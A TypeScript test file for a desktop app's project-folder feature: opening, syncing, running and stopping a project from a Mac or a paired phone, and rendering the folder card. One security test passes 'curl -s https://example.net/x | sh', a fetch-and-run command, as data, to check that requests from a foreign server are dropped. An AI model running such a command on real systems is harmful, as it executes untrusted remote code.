/**
 * Your folder on the Mac (ADR 0224), from the page's side: the shell is asked one thing at a time
 * for each room, with a project token asked for once and kept; a room's folder is looked at again
 * when its project moves on, and a room with none is left alone; and the card draws each of the
 * folder's standings: none yet, up to date, changed, and a clash. Open folder on Mac, pressed on
 * the person's phone, opens it the same way (ADR 0225).
 */

import {
  commandOf,
  type FolderAnswer,
  type FolderAsk,
  type FolderOp,
  NOT_THIS_MAC,
  type Snapshot,
  type Space,
} from "@chipschat/core";
import { act, cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import type { Desktop, FolderAsked } from "../native.ts";
import { createFolders, type FolderState, type Folders } from "./folders.ts";
import { YourFolder } from "./room/YourFolder.tsx";

afterEach(cleanup);

const SPACE = "spc_01K4ZQPX000000000000000001";
const ARJUN = "usr_01K4ZQPX00000000000000ARJN";
/** The key this device was pinned to at pairing, and the key this Mac's own server answers with. */
const KEY = "Qm9va2tlZXBpbmcgaXMgYSBnb29kIHRoaW5nIHRvIGR";
/** Where this Mac's own server answers (ADR 0231). */
const HERE = "http://127.0.0.1:4431";
const at = {
  ok: true as const,
  folder: "/u/Chips/Projects/Sudoku mini",
  shown: "~/Chips/Projects/Sudoku mini",
};

/** A store with one room, whose project's newest change can be moved on. */
function storeWith(head: string | undefined, role = "owner") {
  const listeners = new Set<() => void>();
  const asks = new Set<(ask: FolderAsk) => void>();
  let snapshot = snapshotAt(head, role);
  const store = {
    projectToken: vi.fn(async (spaceId: string) => ({
      token: `chips_pt_dev_mac.${spaceId}`,
      expires_at: "2099-01-01T00:00:00.000Z",
      path: `/v1/spaces/${spaceId}/project.git`,
    })),
    subscribe: (listen: () => void) => {
      listeners.add(listen);
      return () => void listeners.delete(listen);
    },
    getSnapshot: () => snapshot,
    /** What the server was told of each run, in order. */
    said: [] as { spaceId: string; run: unknown }[],
    sayRun: vi.fn(async (spaceId: string, run: unknown) => {
      store.said.push({ spaceId, run });
    }),
    onFolderAsk: (listen: (ask: FolderAsk) => void) => {
      asks.add(listen);
      return () => void asks.delete(listen);
    },
    /** The person's phone asks for a room's folder, as the server's `folder.open` arrives. */
    ask: (ask: FolderAsk) => {
      for (const listen of asks) listen(ask);
    },
    move: (next: string) => {
      snapshot = snapshotAt(next, role);
      for (const listen of listeners) listen();
    },
  };
  return store as typeof store & Parameters<typeof createFolders>[0]["store"];
}

function snapshotAt(
  head: string | undefined,
  role = "owner",
): Pick<Snapshot, "model" | "directory"> {
  const space = {
    id: SPACE,
    title: "Sudoku mini",
    members: [],
    project: head === undefined ? undefined : { files: 1, changes: [{ commit: head }] },
  } as unknown as Space;
  return {
    model: {
      spaces: [space],
      people: { [ARJUN]: { participantId: ARJUN, displayName: "Arjun", role } },
    } as unknown as Snapshot["model"],
    directory: new Map() as unknown as Snapshot["directory"],
  };
}

function shellAnswering(
  answer: (op: FolderOp, asked: FolderAsked) => FolderAnswer,
  // `null` for a Mac whose shell finds no server of its own.
  here: { url: string; key: string } | null = { url: HERE, key: KEY },
) {
  const asks: { op: FolderOp; asked: FolderAsked }[] = [];
  const shell = {
    canRunHere: async () => true,
    serverHere: async () => here ?? undefined,
    projectFolder: vi.fn(async (op: FolderOp, asked: FolderAsked) => {
      asks.push({ op, asked });
      return answer(op, asked);
    }),
  } as unknown as Desktop;
  return { shell, asks };
}

const device = { participantId: ARJUN, displayName: "Arjun", serverKey: KEY };
const room = { id: SPACE, title: "Sudoku mini" };

describe("the page's folders", () => {
  it("keeps none in a browser", async () => {
    const folders = createFolders({
      store: storeWith(undefined),
      device,
      server: "http://mini.local:4431",
      shell: Promise.resolve(undefined),
    });
    expect(await folders.available()).toBe(false);
  });

  it("asks the shell with the room, the server, the person and a token asked for once", async () => {
    const store = storeWith("a".repeat(40));
    const { shell, asks } = shellAnswering(() => ({
      ...at,
      made: true,
      came: ["index.html"],
      cameBy: ["Wynn"],
    }));
    const folders = createFolders({
      store,
      device,
      server: "http://mini.local:4431",
      shell: Promise.resolve(shell),
    });
    expect(await folders.available()).toBe(true);
    await folders.run(room, "open");
    await folders.run(room, "look");
    expect(asks.map((ask) => ask.op)).toEqual(["open", "look"]);
    expect(asks[0]?.asked).toEqual({
      spaceId: SPACE,
      title: "Sudoku mini",
      server: "http://mini.local:4431",
      personId: device.participantId,
      name: "Arjun",
      token: `chips_pt_dev_mac.${SPACE}`,
    });
    expect(store.projectToken).toHaveBeenCalledTimes(1);
    expect(folders.state(SPACE).came).toMatchObject({ files: ["index.html"], by: ["Wynn"] });
  });

  it("looks again when a room's project moves on, and leaves a room with no folder alone", async () => {
    const store = storeWith("a".repeat(40));
    let made = true;
    const { shell, asks } = shellAnswering(() => ({ ...at, made }));
    const folders = createFolders({
      store,
      device,
      server: "http://mini.local:4431",
      shell: Promise.resolve(shell),
    });
    expect(asks).toEqual([]);
    await act(async () => store.move("b".repeat(40)));
    await vi.waitFor(() => expect(asks.map((ask) => ask.op)).toEqual(["look"]));

    made = false;
    await act(async () => store.move("c".repeat(40)));
    await vi.waitFor(() => expect(asks).toHaveLength(2));
    await act(async () => store.move("d".repeat(40)));
    await new Promise((resolve) => setTimeout(resolve, 20));
    expect(asks).toHaveLength(2);
    folders.stop();
  });

  it("opens a room's folder when the phone asks, says who asked, and leaves a room it hasn't alone (ADR 0225)", async () => {
    const store = storeWith("a".repeat(40));
    const { shell, asks } = shellAnswering(() => ({ ...at, made: true, changed: [] }));
    const folders = createFolders({
      store,
      device,
      server: "http://mini.local:4431",
      shell: Promise.resolve(shell),
    });
    store.ask({ spaceId: SPACE, op: "open", from: "iPhone", at: "2026-10-23T22:05:00.000Z" });
    await vi.waitFor(() => expect(asks.map((ask) => ask.op)).toEqual(["open"]));
    expect(asks[0]?.asked).toMatchObject({ spaceId: SPACE, title: "Sudoku mini" });
    await vi.waitFor(() =>
      expect(folders.state(SPACE).asked).toEqual({
        from: "iPhone",
        at: "2026-10-23T22:05:00.000Z",
      }),
    );

    store.ask({
      spaceId: "spc_01K4ZQPX0000000000000000ZZ",
      op: "open",
      from: "iPhone",
      at: "2026-10-23T22:06:00.000Z",
    });
    await new Promise((resolve) => setTimeout(resolve, 20));
    expect(asks).toHaveLength(1);

    // Stopped, it hears no more.
    folders.stop();
    store.ask({ spaceId: SPACE, op: "open", from: "iPhone", at: "2026-10-23T22:07:00.000Z" });
    await new Promise((resolve) => setTimeout(resolve, 20));
    expect(asks).toHaveLength(1);
  });

  it("passes the phone's Open page to the window, for a room it has, and asks the shell nothing (ADR 0227)", async () => {
    const store = storeWith("a".repeat(40));
    const { shell, asks } = shellAnswering(() => ({ ...at, made: true, changed: [] }));
    const folders = createFolders({
      store,
      device,
      server: "http://mini.local:4431",
      shell: Promise.resolve(shell),
    });
    const pages: string[] = [];
    const unlisten = folders.onPage((spaceId) => pages.push(spaceId));
    store.ask({ spaceId: SPACE, op: "page", from: "iPhone", at: "2026-10-24T18:05:00.000Z" });
    store.ask({
      spaceId: "spc_01K4ZQPX0000000000000000ZZ",
      op: "page",
      from: "iPhone",
      at: "2026-10-24T18:06:00.000Z",
    });
    await vi.waitFor(() => expect(pages).toEqual([SPACE]));
    await new Promise((resolve) => setTimeout(resolve, 20));
    expect(asks).toHaveLength(0);
    unlisten();
    store.ask({ spaceId: SPACE, op: "page", from: "iPhone", at: "2026-10-24T18:07:00.000Z" });
    await new Promise((resolve) => setTimeout(resolve, 20));
    expect(pages).toEqual([SPACE]);
    folders.stop();
  });

  it("runs the project, tells the server as it starts and runs, and looks again until it stops (ADR 0226)", async () => {
    vi.useFakeTimers({ shouldAdvanceTime: true });
    try {
      const store = storeWith("a".repeat(40));
      let state: "running" | "stopped" = "running";
      const { shell, asks } = shellAnswering((op) => ({
        ...at,
        made: true,
        run: { state: op === "stop" ? "stopped" : state, command: "make serve" },
      }));
      const folders = createFolders({
        store,
        device,
        server: "http://mini.local:4431",
        shell: Promise.resolve(shell),
      });
      await folders.run(room, "run", { command: "make serve" });
      // Fetched from this Mac's own server over loopback, not the address the device knows it by.
      expect(asks[0]).toMatchObject({ op: "run", asked: { command: "make serve", server: HERE } });
      expect(store.said.map((each) => (each.run as { state: string }).state)).toEqual([
        "starting",
        "running",
      ]);
      await vi.advanceTimersByTimeAsync(3100);
      await vi.waitFor(() => expect(asks.map((ask) => ask.op)).toEqual(["run", "status"]));
      // The same word again isn't told again.
      expect(store.said).toHaveLength(2);

      state = "stopped";
      await vi.advanceTimersByTimeAsync(3100);
      await vi.waitFor(() => expect(store.said).toHaveLength(3));
      expect(folders.state(SPACE).run).toMatchObject({ state: "stopped" });
      await vi.advanceTimersByTimeAsync(10_000);
      expect(asks.map((ask) => ask.op)).toEqual(["run", "status", "status"]);
      folders.stop();
    } finally {
      vi.useRealTimers();
    }
  });

  it("runs and stops when the phone asks, and says why when the Mac's folder says something else", async () => {
    const store = storeWith("a".repeat(40));
    const { shell, asks } = shellAnswering((op) =>
      op === "run"
        ? { ok: false, why: "chips.json in your folder says to run something else now." }
        : { ...at, made: true, run: { state: "stopped", command: "make" } },
    );
    const folders = createFolders({
      store,
      device,
      server: "http://mini.local:4431",
      shell: Promise.resolve(shell),
    });
    store.ask({ spaceId: SPACE, op: "stop", from: "iPhone", at: "2026-10-24T09:05:00.000Z" });
    await vi.waitFor(() => expect(folders.state(SPACE).run).toMatchObject({ state: "stopped" }));
    store.ask({
      spaceId: SPACE,
      op: "run",
      command: "make serve",
      from: "iPhone",
      at: "2026-10-24T09:06:00.000Z",
    });
    await vi.waitFor(() => expect(asks.map((ask) => ask.op)).toEqual(["stop", "run"]));
    expect(asks[1]?.asked.command).toBe("make serve");
    await vi.waitFor(() =>
      expect(folders.state(SPACE).run).toEqual({
        state: "stopped",
        command: "make",
        why: "chips.json in your folder says to run something else now.",
      }),
    );
    expect(folders.state(SPACE).failed).toBeUndefined();
    expect(store.said.at(-1)?.run).toMatchObject({ state: "stopped", why: expect.any(String) });
    folders.stop();
  });

  it("runs and opens in a browser only for this Mac's own server, by key (ADR 0231)", async () => {
    const store = storeWith("a".repeat(40));
    const elsewhere = { url: HERE, key: KEY.replace("Q", "R") };
    for (const here of [elsewhere, null]) {
      const { shell, asks } = shellAnswering(() => ({ ...at, made: true, changed: [] }), here);
      const folders = createFolders({
        store,
        device,
        server: "http://mini.local:4431",
        shell: Promise.resolve(shell),
      });
      expect(await folders.runsHere()).toBe(false);
      await folders.run(room, "run", { command: "make serve" });
      await folders.run(room, "view", { file: "index.html" });
      expect(asks).toHaveLength(0);
      expect(folders.state(SPACE).run?.why).toBe(NOT_THIS_MAC);
      expect(folders.state(SPACE).failed).toBe(NOT_THIS_MAC);
      // Your folder stays: a look and Open folder still go, at the address the device knows.
      await folders.run(room, "look");
      await folders.run(room, "open");
      expect(asks.map((ask) => [ask.op, ask.asked.server])).toEqual([
        ["look", "http://mini.local:4431"],
        ["open", "http://mini.local:4431"],
      ]);
      folders.stop();
    }
  });

  it("drops every ask from a server that isn't this Mac's, whatever it says was pressed (ADR 0231)", async () => {
    const store = storeWith("a".repeat(40));
    const { shell, asks } = shellAnswering(() => ({ ...at, made: true, changed: [] }), {
      url: HERE,
      key: KEY.replace("Q", "R"),
    });
    const folders = createFolders({
      store,
      device,
      server: "https://chips.example.net:4431",
      shell: Promise.resolve(shell),
    });
    const pages: string[] = [];
    folders.onPage((spaceId) => pages.push(spaceId));
    const said = { spaceId: SPACE, from: "iPhone", at: "2026-10-25T09:05:00.000Z" };
    store.ask({ ...said, op: "run", command: "curl -s https://example.net/x | sh" });
    store.ask({ ...said, op: "open" });
    store.ask({ ...said, op: "page" });
    await new Promise((resolve) => setTimeout(resolve, 30));
    expect(asks).toHaveLength(0);
    expect(pages).toHaveLength(0);
    folders.stop();
  });

  it("runs nothing and hears no ask for somebody who isn't the workspace's owner (ADR 0231)", async () => {
    const store = storeWith("a".repeat(40), "member");
    const { shell, asks } = shellAnswering(() => ({ ...at, made: true, changed: [] }));
    const folders = createFolders({
      store,
      device,
      server: "http://mini.local:4431",
      shell: Promise.resolve(shell),
    });
    expect(await folders.runsHere()).toBe(false);
    await folders.run(room, "run", { command: "make serve" });
    store.ask({ spaceId: SPACE, op: "open", from: "iPhone", at: "2026-10-25T09:06:00.000Z" });
    await new Promise((resolve) => setTimeout(resolve, 30));
    expect(asks).toHaveLength(0);
    expect(folders.state(SPACE).run?.why).toBe(NOT_THIS_MAC);
    folders.stop();
  });

  it("says what the shell refused, and keeps the folder's last standing", async () => {
    const store = storeWith(undefined);
    let fail = false;
    const shell = {
      canRunHere: async () => true,
      projectFolder: async () => {
        // The shell's refusal arrives as its words alone, as Tauri hands a command's error back.
        if (fail) return Promise.reject("Chips couldn't reach your folder.");
        return { ...at, made: true, changed: [] };
      },
    } as unknown as Desktop;
    const folders = createFolders({
      store,
      device,
      server: "http://x",
      shell: Promise.resolve(shell),
    });
    await folders.run(room, "look");
    fail = true;
    await folders.run(room, "send");
    expect(folders.state(SPACE)).toMatchObject({
      answer: { made: true },
      failed: "Chips couldn't reach your folder.",
    });
  });
});

/** Folders that answer what a test says, for the card. */
function fakeFolders(
  answer: FolderAnswer,
  came?: { files: string[]; by: string[]; at: string },
  asked?: { from: string; at: string },
  run?: FolderState["run"],
  here = true,
) {
  const runs: { op: FolderOp; extra: unknown }[] = [];
  const state = { answer, came, asked, run };
  const folders: Folders = {
    available: async () => true,
    runsHere: async () => here,
    state: () => state,
    subscribe: () => () => undefined,
    run: async (_room, op, extra) => void runs.push({ op, extra }),
    onPage: () => () => undefined,
    stop: () => undefined,
  };
  return { folders, runs };
}

describe("Your folder's card", () => {
  it("offers Open folder before there is one, and says where it will be", () => {
    const { folders, runs } = fakeFolders({ ...at, made: false });
    render(<YourFolder room={room} folders={folders} program={undefined} />);
    expect(
      screen.getByText(/Makes a copy of the project at ~\/Chips\/Projects\/Sudoku mini/),
    ).toBeTruthy();
    fireEvent.click(screen.getByTestId("your-folder-open"));
    expect(runs.map((run) => run.op)).toEqual(["look", "open"]);
  });

  it("says Up to date, the path, and the last change that came in", () => {
    const { folders, runs } = fakeFolders(
      { ...at, made: true, changed: [], editor: "Cursor" },
      { files: ["src/board.js"], by: ["Wynn"], at: new Date().toISOString() },
    );
    render(<YourFolder room={room} folders={folders} program={undefined} />);
    expect(screen.getByTestId("your-folder-head").textContent).toBe("Up to date");
    expect(screen.getByTestId("your-folder-path").textContent).toBe("~/Chips/Projects/Sudoku mini");
    expect(screen.getByTestId("your-folder-came").textContent).toBe(
      "Wynn's change to src/board.js came in just now.",
    );
    fireEvent.click(screen.getByTestId("your-folder-editor"));
    expect(runs.at(-1)?.op).toBe("editor");
    expect(screen.queryByTestId("your-folder-send")).toBeNull();
  });

  it("says the phone had it opened, until a change comes in after (ADR 0225)", () => {
    const earlier = new Date(Date.now() - 60_000).toISOString();
    const { folders } = fakeFolders(
      { ...at, made: true, changed: [] },
      { files: ["src/board.js"], by: ["Wynn"], at: earlier },
      { from: "iPhone", at: new Date().toISOString() },
    );
    render(<YourFolder room={room} folders={folders} program={undefined} />);
    expect(screen.getByTestId("your-folder-asked").textContent).toBe(
      "Opened from your iPhone just now.",
    );
    cleanup();
    const after = fakeFolders(
      { ...at, made: true, changed: [] },
      { files: ["src/board.js"], by: ["Wynn"], at: new Date().toISOString() },
      { from: "iPhone", at: earlier },
    );
    render(<YourFolder room={room} folders={after.folders} program={undefined} />);
    expect(screen.queryByTestId("your-folder-asked")).toBeNull();
    expect(screen.getByTestId("your-folder-came")).toBeTruthy();
  });

  it("lists what the person changed, takes words for it, and sends it", () => {
    const { folders, runs } = fakeFolders({
      ...at,
      made: true,
      changed: [
        { path: "index.html", added: 1, removed: 1 },
        { path: "style.css", added: 6, removed: 2 },
      ],
      since: ["src/game.js"],
      by: ["Wynn"],
    });
    render(<YourFolder room={room} folders={folders} program={undefined} />);
    expect(screen.getByTestId("your-folder-head").textContent).toBe("You changed 2 files");
    expect(screen.getByTestId("your-folder-changed").textContent).toContain("style.css+6 −2");
    expect(screen.getByTestId("your-folder-since").textContent).toMatch(
      /^Wynn has changed src\/game\.js since\./,
    );
    expect(screen.queryByTestId("your-folder-editor")).toBeNull();
    fireEvent.change(screen.getByTestId("your-folder-words"), {
      target: { value: " Bigger cells on small screens " },
    });
    fireEvent.click(screen.getByTestId("your-folder-send"));
    expect(runs.at(-1)).toEqual({ op: "send", extra: { words: "Bigger cells on small screens" } });
  });

  it("tells a guest they read the project and send nothing, in Send's place (SEC-40)", () => {
    const { folders } = fakeFolders({
      ...at,
      made: true,
      changed: [{ path: "index.html", added: 1, removed: 1 }],
    });
    render(<YourFolder room={room} folders={folders} program={undefined} sends={false} />);
    expect(screen.getByTestId("your-folder-head").textContent).toBe("You changed 1 file");
    expect(screen.queryByTestId("your-folder-send")).toBeNull();
    expect(screen.queryByTestId("your-folder-words")).toBeNull();
    expect(screen.getByTestId("your-folder-reads-only").textContent).toBe(
      "A guest can read the project but can't change it. Ask an agent in the space.",
    );
  });

  it("shows a clash's marked lines, opens the file, and holds Send", () => {
    const { folders, runs } = fakeFolders({
      ...at,
      made: true,
      changed: [
        { path: "index.html", added: 1, removed: 1 },
        { path: "style.css", added: 1, removed: 1 },
      ],
      clashes: ["style.css"],
      clashedWith: ["Hazel"],
      marked: ".cell {\n<<<<<<< yours\n  width: 44px;\n=======\n  width: 38px;\n>>>>>>> Hazel\n}",
    });
    render(<YourFolder room={room} folders={folders} program={undefined} />);
    expect(screen.getByTestId("your-folder-head").textContent).toBe("Not sent yet");
    expect(screen.getByTestId("your-folder-clash").textContent).toContain(
      "style.css clashed with Hazel's change",
    );
    expect(screen.getByTestId("your-folder-marked").textContent).toContain(">>>>>>> Hazel");
    expect((screen.getByTestId("your-folder-send") as HTMLButtonElement).disabled).toBe(true);
    expect(screen.getByText(/^Your change to index\.html is waiting with it\./)).toBeTruthy();
    fireEvent.click(screen.getByTestId("your-folder-file"));
    expect(runs.at(-1)).toEqual({ op: "file", extra: { file: "style.css" } });
  });
});

describe("Run on the Mac's card (ADR 0226)", () => {
  const recipe = { run: "python3 -m http.server 8000", opens: "http://localhost:8000" };

  it("has no Programs where the space made no program, and says why a run file can't be used (ADR 0227)", async () => {
    const { folders } = fakeFolders({ ...at, made: true, changed: [] });
    const { unmount } = render(<YourFolder room={room} folders={folders} program={undefined} />);
    expect(screen.queryByTestId("run-bar")).toBeNull();
    expect(screen.queryByText("Programs")).toBeNull();
    unmount();
    render(
      <YourFolder room={room} folders={folders} program={{ why: ".chips/run.json isn't JSON." }} />,
    );
    expect(((await screen.findByTestId("run-bar-run")) as HTMLButtonElement).disabled).toBe(true);
    expect(screen.getByTestId("run-bar-words").textContent).toBe(".chips/run.json isn't JSON.");
  });

  it("says what it runs and where, and runs exactly that", async () => {
    const { folders, runs } = fakeFolders({ ...at, made: true, changed: [] });
    render(<YourFolder room={room} folders={folders} program={recipe} />);
    expect((await screen.findByTestId("run-bar-words")).textContent).toBe(
      "Runs python3 -m http.server 8000 in ~/Chips/Projects/Sudoku mini, then opens localhost:8000.",
    );
    fireEvent.click(screen.getByTestId("run-bar-run"));
    expect(runs.at(-1)).toEqual({ op: "run", extra: { command: commandOf(recipe) } });
  });

  it("says in amber when the agents changed how it runs since the last run", async () => {
    const { folders } = fakeFolders({ ...at, made: true, changed: [] }, undefined, undefined, {
      state: "stopped",
      command: "python3 -m http.server 3000",
    });
    render(<YourFolder room={room} folders={folders} program={recipe} />);
    expect((await screen.findByTestId("run-bar-words")).textContent).toMatch(
      /^Changed since you last ran it\. Runs python3/,
    );
  });

  it("names who else changed the files since the run's commit, and runs it all the same (SEC-40)", async () => {
    const commit = "a".repeat(40);
    const { folders, runs } = fakeFolders(
      { ...at, made: true, changed: [] },
      undefined,
      undefined,
      { state: "stopped", command: commandOf(recipe), commit },
    );
    const asked: (string | undefined)[] = [];
    const changedSince = (at?: string) => {
      asked.push(at);
      return ["Dana", "Dana's agent"];
    };
    render(
      <YourFolder room={room} folders={folders} program={recipe} changedSince={changedSince} />,
    );
    expect((await screen.findByTestId("run-bar-words")).textContent).toMatch(
      /^Changed by Dana and Dana's agent since you last ran it\. Runs python3/,
    );
    expect(asked).toContain(commit);
    fireEvent.click(screen.getByTestId("run-bar-run"));
    expect(runs.at(-1)).toEqual({ op: "run", extra: { command: commandOf(recipe) } });
  });

  it("shows a run going with Stop and Run again, and one that failed with its last lines", async () => {
    const since = new Date(Date.now() - 125_000).toISOString();
    const { folders, runs } = fakeFolders(
      { ...at, made: true, changed: [] },
      undefined,
      undefined,
      {
        state: "running",
        command: commandOf(recipe),
        since,
        opened: "http://localhost:8000",
      },
    );
    const { unmount } = render(<YourFolder room={room} folders={folders} program={recipe} />);
    expect((await screen.findByTestId("run-bar-state")).textContent).toBe(
      "Running on your Mac2 min",
    );
    expect(screen.getByTestId("run-bar-words").textContent).toBe(
      "Opened localhost:8000 in your browser.",
    );
    fireEvent.click(screen.getByTestId("run-bar-stop"));
    expect(runs.at(-1)).toEqual({ op: "stop", extra: undefined });
    unmount();

    const failed = fakeFolders({ ...at, made: true, changed: [] }, undefined, undefined, {
      state: "failed",
      command: commandOf(recipe),
      since: "2026-10-24T09:00:00.000Z",
      ended: "2026-10-24T09:00:03.000Z",
      code: 1,
      lines: ["Error: Cannot find module 'vite'"],
    });
    render(<YourFolder room={room} folders={failed.folders} program={recipe} />);
    expect((await screen.findByTestId("run-bar-state")).textContent).toBe(
      "It stopped after 3 seconds.",
    );
    expect(screen.getByTestId("run-bar-lines").textContent).toBe(
      "Error: Cannot find module 'vite'",
    );
    fireEvent.click(screen.getByTestId("run-bar-again"));
    expect(failed.runs.at(-1)).toEqual({ op: "run", extra: { command: commandOf(recipe) } });
  });

  it("offers no Run on a Mac that doesn't run the workspace's server, and says where it runs (ADR 0231)", async () => {
    const { folders, runs } = fakeFolders(
      { ...at, made: true, changed: [] },
      undefined,
      undefined,
      undefined,
      false,
    );
    render(<YourFolder room={room} folders={folders} program={recipe} />);
    expect((await screen.findByTestId("run-not-here")).textContent).toBe(NOT_THIS_MAC);
    expect(screen.queryByTestId("run-bar-run")).toBeNull();
    expect(runs.filter((each) => each.op === "run")).toHaveLength(0);
  });
});
